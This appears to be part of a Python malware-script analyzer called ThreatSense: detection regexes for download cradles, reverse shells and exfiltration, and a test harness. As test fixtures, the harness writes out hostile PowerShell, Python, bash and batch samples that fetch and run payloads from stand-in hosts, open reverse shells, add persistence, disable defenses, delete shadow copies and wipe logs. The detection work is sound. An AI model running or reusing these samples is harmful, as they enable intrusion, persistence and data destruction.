        entropy = _calculate_entropy(file_bytes) if file_bytes else 0.0
        return {
            "filename": filename,
            "input_type": "script",
            "file_type": "Script (analysis error)",
            "md5": hashes["md5"],
            "sha1": hashes["sha1"],
            "sha256": hashes["sha256"],
            "size_bytes": len(file_bytes) if file_bytes else 0,
            "entropy": entropy,
            "entropy_verdict": _entropy_verdict(entropy),
            "language": "unknown",
            "obfuscation_found": False,
            "obfuscation_details": [],
            "dangerous_calls": [],
            "persistence_indicators": [],
            "iocs": {"ips": [], "domains": [], "urls": [], "registry_keys": [], "file_paths": []},
            "risk_score": 0,
            "error": str(exc),
        }


def _detect_compound_patterns(content: str, language: str) -> list:
    """
    Detect compound multi-step attack patterns that are more severe than
    their individual components.  E.g. curl|bash is a download-and-execute
    chain, not just "uses curl" + "pipes to bash".
    """
    findings = []
    lower = content.lower()
    lines = content.split("\n")

    # --- Download-and-execute chains ---
    dae_patterns = [
        (r"curl\s+[^|]+\|\s*(?:ba)?sh",
         "Download-and-execute via curl pipe to shell", 40),
        (r"wget\s+[^|]+\|\s*(?:ba)?sh",
         "Download-and-execute via wget pipe to shell", 40),
        (r"curl\s+[^|]+\|\s*python",
         "Download-and-execute via curl pipe to Python", 35),
        (r"wget\s+[^|]+\|\s*python",
         "Download-and-execute via wget pipe to Python", 35),
        (r"(?:Invoke-WebRequest|iwr|wget|curl)[^;\n]*\|\s*(?:Invoke-Expression|IEX)",
         "PowerShell download cradle — fetches and executes remote code", 40),
        (r"\(New-Object\s+Net\.WebClient\)\.DownloadString\(",
         "PowerShell download cradle — classic .NET WebClient pattern", 40),
        (r"certutil\s+-urlcache\s+-split\s+-f\s+http",
         "LOLBin download via certutil — stealthy file download", 35),
        (r"bitsadmin\s+/transfer\s+[^\n]*http",
         "LOLBin download via BITS — stealthy file transfer", 35),
    ]

    for pattern, desc, score in dae_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            # Find the line
            match_lines = []
            for i, line in enumerate(lines, 1):
                if re.search(pattern, line, re.IGNORECASE):
                    match_lines.append({"line_number": i, "content": line.strip()[:150]})
                    break

            findings.append({
                "pattern": desc,
                "severity_score": score,
                "severity": "CRITICAL" if score >= 35 else "HIGH",
                "locations": match_lines,
            })

    # --- Reverse shell patterns ---
    revshell_patterns = [
        (r"(?:bash|sh)\s+-i\s+>\s*&\s*/dev/tcp/",
         "Bash reverse shell via /dev/tcp", 40),
        (r"nc\s+-e\s+/bin/(?:ba)?sh\s",
         "Netcat reverse shell with -e flag", 40),
        (r"mkfifo\s+[^;]+;.*nc\s",
         "Named-pipe reverse shell via mkfifo + netcat", 40),
        (r"socket\.[\s\S]*?\.connect\([\s\S]*?\.recv\([\s\S]*?(?:exec|subprocess|os\.system)",
         "Python reverse shell — socket connect with command execution", 40),
        (r"\$client\s*=\s*New-Object\s+System\.Net\.Sockets\.TCPClient",
         "PowerShell reverse shell via TCPClient", 40),
    ]

    for pattern, desc, score in revshell_patterns:
        if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
            findings.append({
                "pattern": desc,
                "severity_score": score,
                "severity": "CRITICAL",
                "locations": [],
            })

    # --- Data exfiltration patterns ---
    exfil_patterns = [
        (r"tar\s+[^|]*\|.*(?:curl|nc|ssh|scp)",
         "Archive piped to network tool — potential data exfiltration", 30),
        (r"zip\s+[^|]*\|.*(?:curl|nc)",
         "Compressed data piped to network — potential exfiltration", 30),
    ]

    for pattern, desc, score in exfil_patterns:
        if re.search(pattern, lower, re.IGNORECASE):
            findings.append({
                "pattern": desc,
                "severity_score": score,
                "severity": "HIGH",
                "locations": [],
            })

    return findings


def _extract_interesting_strings(content: str, max_strings: int = 30) -> list:
    """
    Extract the most interesting / suspicious strings from script text.
    Surfaces hardcoded URLs, IPs, paths, base64 blobs, and commands.
    """
    interesting = []
    seen = set()

    # URLs
    for url in _extract_urls(content):
        if url not in seen:
            interesting.append({"value": url, "type": "URL"})
            seen.add(url)

    # IPs (non-private, non-loopback)
    for ip in _extract_ips(content):
        if ip not in seen:
            interesting.append({"value": ip, "type": "IP Address"})
            seen.add(ip)

    # Registry keys
    for key in _extract_registry_keys(content):
        if key not in seen:
            interesting.append({"value": key, "type": "Registry Key"})
            seen.add(key)

    # File paths (Windows)
    for path in _extract_file_paths(content):
        if path not in seen:
            interesting.append({"value": path, "type": "File Path"})
            seen.add(path)

    # Long base64 blobs
    for b64 in RE_BASE64.findall(content):
        if len(b64) >= 40 and b64 not in seen:
            interesting.append({"value": b64[:80] + ("..." if len(b64) > 80 else ""), "type": "Base64 Blob"})
            seen.add(b64)

    return interesting[:max_strings]


def _generate_verdict(
    language: str,
    risk_score: int,
    obfuscation_details: list,
    dangerous_calls: list,
    compound_patterns: list,
    persistence_indicators: list,
    iocs: dict,
) -> str:
    """
    Generate a plain-English summary verdict describing what this script does.
    This pre-LLM verdict gives analysts (and judges) immediate context.
    """
    parts = []
    lang_display = language.capitalize() if language != "unknown" else "Script"

    # Overall risk classification
    if risk_score >= 75:
        parts.append(f"{lang_display} script assessed as HIGH RISK (score: {risk_score}/100).")
    elif risk_score >= 50:
        parts.append(f"{lang_display} script assessed as MEDIUM-HIGH RISK (score: {risk_score}/100).")
    elif risk_score >= 30:
        parts.append(f"{lang_display} script assessed as MEDIUM RISK (score: {risk_score}/100).")
    elif risk_score >= 10:
        parts.append(f"{lang_display} script assessed as LOW RISK (score: {risk_score}/100).")
    else:
        parts.append(f"{lang_display} script assessed as MINIMAL RISK (score: {risk_score}/100).")

    # Obfuscation
    if obfuscation_details:
        types = set(o.get("type", "") for o in obfuscation_details)
        if "powershell_encoded_command" in types:
            parts.append("Contains PowerShell -EncodedCommand with hidden UTF-16LE payload.")
        elif "base64_encoding" in types:
            parts.append("Contains base64-encoded payload that decodes to executable content.")
        if "charcode_obfuscation" in types:
            parts.append("Uses String.fromCharCode obfuscation to build commands dynamically.")
        if "backtick_obfuscation" in types:
            parts.append("Uses backtick character escaping to evade keyword detection.")

    # Compound patterns
    for cp in compound_patterns:
        parts.append(cp["pattern"] + ".")

    # Key dangerous calls
    critical_calls = [c for c in dangerous_calls if c.get("severity") == "CRITICAL"]
    if critical_calls:
        names = ", ".join(c["function"] for c in critical_calls[:3])
        parts.append(f"Critical dangerous functions detected: {names}.")

    # Persistence
    if persistence_indicators:
        parts.append(f"{len(persistence_indicators)} persistence mechanism(s) detected.")

    # IOC summary
    ip_count = len(iocs.get("ips", []))
    url_count = len(iocs.get("urls", []))
    if ip_count or url_count:
        parts.append(f"Extracted {ip_count} IP(s) and {url_count} URL(s) as indicators of compromise.")

    return " ".join(parts) if parts else "No significant findings."


def _analyze_script_impl(file_bytes: bytes, filename: str) -> dict:
    """Core implementation — may raise on truly malformed data."""

    # --- Step 1: Hashes & entropy ---
    hashes = _compute_hashes(file_bytes)
    entropy = _calculate_entropy(file_bytes)
    size_bytes = len(file_bytes)

    # --- Step 2: Decode to text ---
    content = None
    for encoding in ("utf-8", "utf-16", "latin-1", "ascii"):
        try:
            content = file_bytes.decode(encoding, errors="replace")
            break
        except Exception:
            continue

    if content is None:
        content = file_bytes.decode("latin-1", errors="replace")

    # --- Step 3: Detect language ---
    language = _detect_language(content, filename)

    # --- Step 4: Detect and decode obfuscation ---
    obfuscation_details = _detect_obfuscation(content, language)
    obfuscation_found = len(obfuscation_details) > 0

    # --- Step 5: Detect dangerous function calls (with cross-language) ---
    # Also scan decoded obfuscation payloads so cross-language patterns
    # (e.g. IEX from decoded PowerShell -enc inside batch files) are caught.
    scan_content_for_calls = content
    for obf in obfuscation_details:
        decoded = obf.get("decoded", "")
        if decoded:
            scan_content_for_calls += "\n" + decoded
    dangerous_calls = _detect_dangerous_calls(scan_content_for_calls, language)

    # --- Step 5b: Detect compound attack patterns ---
    compound_patterns = _detect_compound_patterns(scan_content_for_calls, language)

    # --- Step 6: Extract IOCs ---
    # Scan original content + any decoded obfuscation payloads
    scan_text = content
    for obf in obfuscation_details:
        decoded = obf.get("decoded", "")
        if decoded:
            scan_text += "\n" + decoded
        decoded_iocs = obf.get("decoded_iocs", {})
        for url in decoded_iocs.get("urls", []):
            scan_text += "\n" + url

    ips = _extract_ips(scan_text)
    domains = _extract_domains(scan_text)
    urls = _extract_urls(scan_text)
    registry_keys = _extract_registry_keys(scan_text)
    file_paths = _extract_file_paths(scan_text)

    iocs = {
        "ips": ips,
        "domains": domains,
        "urls": urls,
        "registry_keys": registry_keys,
        "file_paths": file_paths,
    }

    # --- Step 7: Detect persistence indicators ---
    persistence_indicators = _detect_persistence(content)

    # --- Step 8: Calculate risk score ---
    risk_score = _calculate_risk_score(
        entropy, obfuscation_details, dangerous_calls, persistence_indicators, iocs
    )

    # Boost risk score for compound attack patterns
    for cp in compound_patterns:
        risk_score = min(risk_score + cp.get("severity_score", 0) // 3, 100)

    # --- Step 8b: Extract interesting strings ---
    interesting_strings = _extract_interesting_strings(content)

    # --- Step 8c: Generate human-readable verdict ---
    verdict = _generate_verdict(
        language, risk_score, obfuscation_details, dangerous_calls,
        compound_patterns, persistence_indicators, iocs,
    )

    # --- Step 9: Build file type string ---
    language_display = {
        "powershell": "PowerShell Script",
        "python": "Python Script",
        "javascript": "JavaScript / Node.js Script",
        "bash": "Bash / Shell Script",
        "batch": "Windows Batch Script",
        "vbscript": "VBScript",
        "ruby": "Ruby Script",
        "perl": "Perl Script",
        "php": "PHP Script",
        "unknown": "Script (language unknown)",
    }
    file_type = language_display.get(language, f"Script ({language})")

    # --- Step 10: Build and return result ---
    return {
        "filename": filename,
        "input_type": "script",
        "file_type": file_type,
        "md5": hashes["md5"],
        "sha1": hashes["sha1"],
        "sha256": hashes["sha256"],
        "size_bytes": size_bytes,
        "entropy": entropy,
        "entropy_verdict": _entropy_verdict(entropy),
        "language": language,
        "obfuscation_found": obfuscation_found,
        "obfuscation_details": obfuscation_details,
        "dangerous_calls": dangerous_calls,
        "compound_patterns": compound_patterns,
        "persistence_indicators": persistence_indicators,
        "iocs": iocs,
        "interesting_strings": interesting_strings,
        "risk_score": risk_score,
        "verdict": verdict,
    }


# ---------------------------------------------------------------------------
#  Standalone test harness
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print("=" * 70)
    print("THREATSENSE — SCRIPT ANALYZER TEST SUITE")
    print("=" * 70)

    # ---- Test 1: Obfuscated PowerShell (Demo File 2) ----
    print("\n--- Test 1: Obfuscated PowerShell (Demo File 2) ---")
    ps_script = (
        '$encoded = "SW52b2tlLUV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCku'
        'RG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTMuNDIuMTEuMjMvc3RhZ2UyLnBzMScp"\n'
        "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString("
        "[System.Convert]::FromBase64String($encoded)))\n"
    )
    r1 = analyze_script(ps_script.encode("utf-8"), "suspicious_update.ps1")
    print(f"  Language:      {r1['language']}")
    print(f"  Risk Score:    {r1['risk_score']}/100")
    print(f"  Obfuscation:   {r1['obfuscation_found']} ({len(r1['obfuscation_details'])} findings)")
    for obf in r1["obfuscation_details"]:
        print(f"    → [{obf['severity']}] {obf['type']}: {obf.get('decoded', '')[:80]}")
    print(f"  Dangerous calls: {len(r1['dangerous_calls'])}")
    for dc in r1["dangerous_calls"][:5]:
        print(f"    → [{dc['severity']}] {dc['function']}: {dc['reason']}")
    print(f"  IOC IPs:       {r1['iocs']['ips']}")
    print(f"  IOC URLs:      {r1['iocs']['urls']}")

    assert r1["language"] == "powershell", "Should detect PowerShell"
    assert r1["obfuscation_found"], "Should find obfuscation"
    assert "193.42.11.23" in r1["iocs"]["ips"], "Should extract C2 IP"
    assert r1["risk_score"] > 40, "Should be high risk"
    print("  [PASS] All assertions passed")

    # ---- Test 2: Malicious Python script ----
    print("\n--- Test 2: Malicious Python script ---")
    py_script = b"""#!/usr/bin/env python3
import os
import subprocess
import socket
import base64

def connect_c2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.50", 4444))
    while True:
        cmd = s.recv(1024).decode()
        output = subprocess.check_output(cmd, shell=True)
        s.send(output)

def persist():
    os.system('reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d "python backdoor.py"')

encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2NhbGMuZXhlJyk="
exec(base64.b64decode(encoded_payload).decode())

if __name__ == "__main__":
    persist()
    connect_c2()
"""
    r2 = analyze_script(py_script, "backdoor.py")
    print(f"  Language:      {r2['language']}")
    print(f"  Risk Score:    {r2['risk_score']}/100")
    print(f"  Obfuscation:   {r2['obfuscation_found']}")
    print(f"  Dangerous calls: {len(r2['dangerous_calls'])}")
    print(f"  Persistence:   {len(r2['persistence_indicators'])}")
    print(f"  IOC IPs:       {r2['iocs']['ips']}")
    print(f"  Registry keys: {r2['iocs']['registry_keys']}")

    assert r2["language"] == "python", "Should detect Python"
    assert r2["obfuscation_found"], "Should find base64 obfuscation"
    assert r2["risk_score"] > 50, "Should be high risk"
    assert len(r2["dangerous_calls"]) > 3, "Should find multiple dangerous calls"
    assert len(r2["persistence_indicators"]) > 0, "Should find persistence"
    assert "10.0.0.50" in r2["iocs"]["ips"], "Should extract C2 IP"
    print("  [PASS] All assertions passed")

    # ---- Test 3: Dangerous Bash script ----
    print("\n--- Test 3: Dangerous Bash script ---")
    bash_script = b"""#!/bin/bash
# Reverse shell
curl http://evil-server.ru/payload.sh | bash
wget http://193.42.11.23/backdoor -O /tmp/bd
chmod +x /tmp/bd
/tmp/bd &
echo "* * * * * /tmp/bd" | crontab -
nc -e /bin/sh 10.0.0.100 9999 &
rm -rf /var/log/*
"""
    r3 = analyze_script(bash_script, "setup.sh")
    print(f"  Language:      {r3['language']}")
    print(f"  Risk Score:    {r3['risk_score']}/100")
    print(f"  Dangerous calls: {len(r3['dangerous_calls'])}")
    for dc in r3["dangerous_calls"][:5]:
        print(f"    → [{dc['severity']}] {dc['function']}")
    print(f"  Persistence:   {len(r3['persistence_indicators'])}")
    print(f"  IOC IPs:       {r3['iocs']['ips']}")
    print(f"  IOC Domains:   {r3['iocs']['domains']}")
    print(f"  IOC URLs:      {r3['iocs']['urls']}")

    assert r3["language"] == "bash", "Should detect Bash"
    assert r3["risk_score"] > 50, "Should be high risk"
    assert "193.42.11.23" in r3["iocs"]["ips"], "Should extract C2 IP"
    assert len(r3["dangerous_calls"]) > 3, "Should find curl|bash, chmod, nc"
    assert len(r3["persistence_indicators"]) > 0, "Should find crontab persistence"
    print("  [PASS] All assertions passed")

    # ---- Test 4: Malicious Batch script ----
    print("\n--- Test 4: Malicious Batch script ---")
    batch_script = b"""@echo off
reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d "C:\\malware.exe" /f
schtasks /create /tn "SystemUpdate" /tr "C:\\malware.exe" /sc onlogon /f
netsh advfirewall set allprofiles state off
certutil -urlcache -split -f http://193.42.11.23/payload.exe C:\\Windows\\Temp\\payload.exe
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled No
taskkill /im MsMpEng.exe /f
powershell.exe -enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AcgB1AC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkAKQA=
"""
    r4 = analyze_script(batch_script, "update.bat")
    print(f"  Language:      {r4['language']}")
    print(f"  Risk Score:    {r4['risk_score']}/100")
    print(f"  Dangerous calls: {len(r4['dangerous_calls'])}")
    for dc in r4["dangerous_calls"][:5]:
        print(f"    → [{dc['severity']}] {dc['function']}")
    print(f"  Persistence:   {len(r4['persistence_indicators'])}")
    print(f"  IOC IPs:       {r4['iocs']['ips']}")

    assert r4["language"] == "batch", "Should detect Batch"
    assert r4["risk_score"] > 60, "Should be very high risk"
    assert len(r4["dangerous_calls"]) > 5, "Should find many dangerous calls"
    assert len(r4["persistence_indicators"]) > 0, "Should find persistence"
    print("  [PASS] All assertions passed")

    # ---- Test 5: Clean Python script ----
    print("\n--- Test 5: Clean Python script ---")
    clean_py = b"""#!/usr/bin/env python3
\"\"\"Simple HTTP server for serving static files.\"\"\"

import http.server
import socketserver

PORT = 8080

class MyHandler(http.server.SimpleHTTPRequestHandler):
    pass

with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"Serving on port {PORT}")
    httpd.serve_forever()
"""
    r5 = analyze_script(clean_py, "server.py")
    print(f"  Language:      {r5['language']}")
    print(f"  Risk Score:    {r5['risk_score']}/100")
    print(f"  Obfuscation:   {r5['obfuscation_found']}")
    print(f"  Dangerous calls: {len(r5['dangerous_calls'])}")

    assert r5["language"] == "python", "Should detect Python"
    assert r5["risk_score"] < 30, f"Should be low risk, got {r5['risk_score']}"
    assert not r5["obfuscation_found"], "Should not find obfuscation"
    print("  [PASS] All assertions passed")

    # ---- Test 6: JavaScript with obfuscation ----
    print("\n--- Test 6: JavaScript with charcode obfuscation ---")
    js_script = b"""
var cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108);
eval(cmd);
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://evil-cdn.xyz/payload.js");
var shell = new ActiveXObject("WScript.Shell");
shell.Run(cmd);
"""
    r6 = analyze_script(js_script, "widget.js")
    print(f"  Language:      {r6['language']}")
    print(f"  Risk Score:    {r6['risk_score']}/100")
    print(f"  Obfuscation:   {r6['obfuscation_found']}")
    for obf in r6["obfuscation_details"]:
        print(f"    → [{obf['severity']}] {obf['type']}: {obf.get('decoded', '')[:60]}")
    print(f"  Dangerous calls: {len(r6['dangerous_calls'])}")
    print(f"  IOC Domains:   {r6['iocs']['domains']}")

    assert r6["language"] == "javascript", "Should detect JavaScript"
    assert r6["risk_score"] > 40, "Should be high risk"
    assert len(r6["dangerous_calls"]) > 3, "Should find eval, ActiveXObject, WScript.Shell, etc."
    print("  [PASS] All assertions passed")

    # ---- Test 7: Firewall log (Demo File 3) ----
    print("\n--- Test 7: Firewall log (text, treated as script) ---")
    firewall_log = (
        b"2026-03-05 03:47:22 OUTBOUND TCP 192.168.1.105:54821 -> 193.42.11.23:443 ALLOW 2847293 bytes\n"
        b"2026-03-05 03:47:23 OUTBOUND TCP 192.168.1.105:54822 -> 193.42.11.23:443 ALLOW 1923847 bytes\n"
        b"2026-03-05 03:48:22 OUTBOUND TCP 192.168.1.105:54901 -> 193.42.11.23:443 ALLOW 2901234 bytes\n"
        b"2026-03-05 03:49:22 OUTBOUND TCP 192.168.1.105:54944 -> 193.42.11.23:443 ALLOW 2756891 bytes\n"
        b"2026-03-05 03:50:22 OUTBOUND TCP 192.168.1.105:54991 -> 193.42.11.23:443 ALLOW 2634521 bytes\n"
    )
    r7 = analyze_script(firewall_log, "firewall_log.txt")
    print(f"  Risk Score:    {r7['risk_score']}/100")
    print(f"  IOC IPs:       {r7['iocs']['ips']}")

    assert "193.42.11.23" in r7["iocs"]["ips"], "Must extract C2 IP for correlation"
    assert "192.168.1.105" in r7["iocs"]["ips"], "Must extract internal IP"
    print("  [PASS] All assertions passed")

    # ---- Test 8: Empty / garbage input ----
    print("\n--- Test 8: Edge cases ---")
    r8a = analyze_script(b"", "empty.ps1")
    assert r8a["input_type"] == "script", "Empty: should not crash"
    print("  [PASS] Empty input handled")

    r8b = analyze_script(b"\x00\xff\xfe\xfd", "garbage.js")
    assert r8b["input_type"] == "script", "Garbage: should not crash"
    print("  [PASS] Garbage input handled")

    r8c = analyze_script(None, "none.py")
    assert r8c["input_type"] == "script", "None: should not crash"
    print("  [PASS] None input handled")

    print(f"\n{'='*70}")
    print("  >>> ALL TESTS PASSED <<<")
    print(f"{'='*70}")
